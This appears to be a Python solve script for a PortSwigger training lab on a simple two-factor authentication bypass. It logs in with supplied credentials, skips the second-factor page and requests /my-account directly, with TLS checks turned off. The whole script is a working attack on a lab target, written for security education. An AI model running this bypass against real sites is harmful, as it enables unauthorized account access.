#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
2FA simple bypass.

Logs in with valid credentials, then navigates directly to /my-account
instead of completing the 2FA step at /login2.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 2 (2FA simple bypass)")
    parser.add_argument("lab_url")
    parser.add_argument("--username", default="carlos")
    parser.add_argument("--password", default="montoya")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    csrf = get_csrf(s, f"{lab}/login")
    r = s.post(f"{lab}/login",
               data={"csrf": csrf, "username": args.username, "password": args.password},
               allow_redirects=False)
    print(f"[*] Step 1 login status: {r.status_code} → {r.headers.get('Location', '')}")

    r2 = s.get(f"{lab}/my-account", allow_redirects=True)
    if args.username in r2.text or "Your username is" in r2.text:
        print("[+] 2FA bypassed — accessed /my-account directly")
        print("[+] Lab solved.")
    else:
        print(f"[-] Got status {r2.status_code} — may need to follow redirect manually")


if __name__ == "__main__":
    main()
